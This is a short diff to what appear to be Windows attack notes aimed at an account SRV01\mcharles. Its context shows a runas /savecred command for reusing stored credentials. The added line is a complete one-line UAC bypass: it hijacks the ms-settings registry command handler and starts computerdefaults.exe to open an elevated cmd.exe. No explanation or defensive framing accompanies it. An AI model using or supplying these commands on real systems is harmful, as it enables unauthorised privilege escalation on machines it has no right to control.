@@ -63,6 +63,10 @@ Target: Domain:interactive=SRV01\mcharles
 
 3) runas /savecred /user:SRV01\mcharles cmd
 
+4) UAC Bypass: reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f && reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe" /f && start computerdefaults.exe
+
+
+
 
 
 
